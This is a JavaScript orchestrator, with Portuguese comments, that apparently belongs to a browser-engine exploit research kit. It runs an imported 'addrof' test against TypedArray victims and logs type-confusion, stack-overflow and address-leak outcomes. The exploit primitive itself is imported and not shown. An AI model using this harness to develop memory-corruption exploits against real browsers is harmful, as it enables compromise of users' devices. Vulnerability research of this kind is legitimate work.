// js/script3/runAllAdvancedTestsS3.mjs
import { logS3, PAUSE_S3, MEDIUM_PAUSE_S3 } from './s3_utils.mjs';
import { getOutputAdvancedS3, getRunBtnAdvancedS3 } from '../dom_elements.mjs';
import { 
    executeTypedArrayVictimAddrofTest_MultiVictimAndLoggingFix,   // NOME DA FUNÇÃO ATUALIZADO
    FNAME_MODULE_TYPEDARRAY_ADDROF_V15_MVLF    // NOME DO MÓDULO ATUALIZADO
} from './testArrayBufferVictimCrash.mjs';

async function runHeisenbugReproStrategy_TypedArrayVictim() {
    const FNAME_RUNNER = "runHeisenbugReproStrategy_TypedArrayVictim_MultiVictimAndLoggingFix";
    logS3(`==== INICIANDO Estratégia de Reprodução do Heisenbug com TypedArray Vítima (MultiVictim) ====`, 'test', FNAME_RUNNER);

    const result = await executeTypedArrayVictimAddrofTest_MultiVictimAndLoggingFix(); 

    logS3(`   Total de chamadas da sonda toJSON durante o teste: ${result.total_probe_calls || 0}`, "info", FNAME_RUNNER); 
    if (result.all_probe_calls_details && result.all_probe_calls_details.length > 0) {
        logS3(`   Detalhes de TODAS as chamadas da sonda: ${JSON.stringify(result.all_probe_calls_details)}`, "dev", FNAME_RUNNER);
    }


    if (result.errorOccurred) {
        logS3(`   RESULTADO: ERRO JS CAPTURADO: ${result.errorOccurred.name} - ${result.errorOccurred.message}.`, "error", FNAME_RUNNER);
        if (result.errorOccurred.name === 'RangeError') {
            logS3(`     RangeError: Maximum call stack size exceeded OCORREU!`, "vuln", FNAME_RUNNER);
            document.title = `Heisenbug (TypedArray-MVLF) RangeError!`; 
         } else {
            document.title = `Heisenbug (TypedArray-MVLF) ERR: ${result.errorOccurred.name}`;
         }
    } else if (result.potentiallyCrashed) { 
         logS3(`   RESULTADO: POTENCIAL ESTOURO DE PILHA (RangeError). Detalhes da última sonda: ${result.all_probe_calls_details && result.all_probe_calls_details.length > 0 ? JSON.stringify(result.all_probe_calls_details[result.all_probe_calls_details.length-1]) : 'N/A'}`, "critical", FNAME_RUNNER);
         if (!document.title.includes("CONGELOU")) document.title = `Heisenbug (TypedArray-MVLF) StackOverflow?`;
    } else {
        logS3(`   RESULTADO: Completou. Stringify Output (truncado): ${result.stringifyResult ? result.stringifyResult.substring(0, 200) + "..." : 'N/A'}`, "good", FNAME_RUNNER);
        
        let any_addrof_success_overall = false;
        let heisenbug_on_victim_observed = false;

        if (result.addrof_results_per_victim) {
            result.addrof_results_per_victim.forEach(res_victim => {
                logS3(`   Vítima #${res_victim.victim_index}: AddrA Success: ${res_victim.A.success} (${res_victim.A.message}), AddrB Success: ${res_victim.B.success} (${res_victim.B.message})`, 
                      res_victim.A.success || res_victim.B.success ? "vuln" : "info", FNAME_RUNNER);
                if (res_victim.A.success || res_victim.B.success) {
                    any_addrof_success_overall = true;
                }
            });
        }

        if (result.all_probe_calls_details) {
            result.all_probe_calls_details.forEach(details => {
                if (details.this_is_one_of_victims && details.this_type_in_toJSON === "[object Object]") {
                    heisenbug_on_victim_observed = true;
                    logS3(`     !!!! TYPE CONFUSION NA VÍTIMA #${details.victim_index} OBSERVADA !!!! Tipo: ${details.this_type_in_toJSON}`, "critical", FNAME_RUNNER);
                }
            });
        }
        
        if (any_addrof_success_overall) {
            document.title = `Heisenbug (TypedArray-MVLF) Addr SUCCESS!`;
        } else if (heisenbug_on_victim_observed) {
            document.title = `Heisenbug (TypedArray-MVLF) Vítima TC, Addr Fail`;
        } else {
            // Checar se houve TC em algum 'this' genérico da sonda, mesmo não sendo a vítima
            let generic_tc_observed = result.all_probe_calls_details && result.all_probe_calls_details.some(d => d.this_type_in_toJSON === "[object Object]" && !d.this_is_one_of_victims);
            if (generic_tc_observed) {
                 document.title = `Heisenbug (TypedArray-MVLF) TC Genérica, Addr Fail`;
            } else if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V15_MVLF) || document.title.includes("Probing")) {
                document.title = `Heisenbug (TypedArray-MVLF) Test OK`;
            }
        }
    }
    logS3(`   Título da página: ${document.title}`, "info");
    await PAUSE_S3(MEDIUM_PAUSE_S3);

    logS3(`==== Estratégia de Reprodução do Heisenbug (MultiVictimAndLoggingFix) CONCLUÍDA ====`, 'test', FNAME_RUNNER);
}

export async function runAllAdvancedTestsS3() {
    const FNAME_ORCHESTRATOR = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V15_MVLF}_MainOrchestrator`; 
    const runBtn = getRunBtnAdvancedS3();
    const outputDiv = getOutputAdvancedS3();

    if (runBtn) runBtn.disabled = true;
    if (outputDiv) outputDiv.innerHTML = '';

    logS3(`==== User Agent: ${navigator.userAgent} ====`,'info', FNAME_ORCHESTRATOR);
    logS3(`==== INICIANDO Script 3 (${FNAME_ORCHESTRATOR}): Reproduzindo Heisenbug com TypedArray Vítima (MultiVictim) ====`, 'test', FNAME_ORCHESTRATOR);

    await runHeisenbugReproStrategy_TypedArrayVictim();

    logS3(`\n==== Script 3 (${FNAME_ORCHESTRATOR}) CONCLUÍDO ====`, 'test', FNAME_ORCHESTRATOR);
    if (runBtn) runBtn.disabled = false;

    if (document.title.startsWith("Iniciando") || document.title.includes(FNAME_MODULE_TYPEDARRAY_ADDROF_V15_MVLF)) {
        if (!document.title.includes("CRASH") && !document.title.includes("RangeError") && 
            !document.title.includes("SUCCESS") && !document.title.includes("Fail") && // Ajustado para não sobrescrever "Fail"
            !document.title.includes("ERR") ) { 
            document.title = `${FNAME_MODULE_TYPEDARRAY_ADDROF_V15_MVLF} Concluído`;
        }
    }
}
